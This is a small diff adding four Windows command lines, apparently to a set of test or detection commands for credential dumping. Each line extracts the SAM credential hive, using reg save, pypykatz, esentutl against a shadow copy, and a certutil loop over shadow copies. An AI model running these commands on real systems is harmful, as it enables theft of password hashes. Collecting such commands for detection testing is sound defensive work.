@@ -1,0 +1,4 @@
+runas /user:blue reg save HKLM\sam %temp%\sam
+runas /user:blue pypykatz live registry
+runas /user:blue esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
+for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 >nul 2>&1) && dir /B %temp%\SAMvss%a
